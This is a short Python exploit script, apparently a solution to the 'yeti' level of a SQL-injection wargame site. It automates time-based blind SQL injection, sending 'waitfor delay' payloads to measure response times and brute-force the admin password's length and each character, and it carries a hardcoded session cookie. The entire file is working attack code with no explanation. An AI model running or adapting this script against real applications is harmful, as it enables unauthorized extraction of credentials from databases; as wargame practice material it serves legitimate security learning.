#!/usr/bin/env python3
# coding: utf-8

import requests
import time
import string

headers = {
    'Cookie': 'PHPSESSID=6b28r4o43epapipkuj2n3oposs',
}

def is_true(query):
    url = "https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php?pw=' if id='admin' and {0} waitfor delay '00:00:01' else waitfor delay '00:00:00'-- -".format(query)
    before = time.time()
    r = requests.get(url, headers=headers)
    after = time.time()
    if (after - before) >= 1:
        return True
    return False


def get_pw_length():
    i = 1
    while True:
        query = "length(pw)={0}".format(i)
        if is_true(query):
            return i
        i += 1


def get_char(location):
    for c in string.printable:
        query = "substring(pw,{0},1)='{1}'".format(location, c)
        if is_true(query):
            return c


def get_pw():
    length = get_pw_length()
    print('[*] pw length :', length)
    password = ''
    for i in range(1, length + 1):
        password += get_char(i)
        print('[*] leaked pw :', password)
    return password


def main():
    get_pw()


if __name__ == '__main__':
    main()
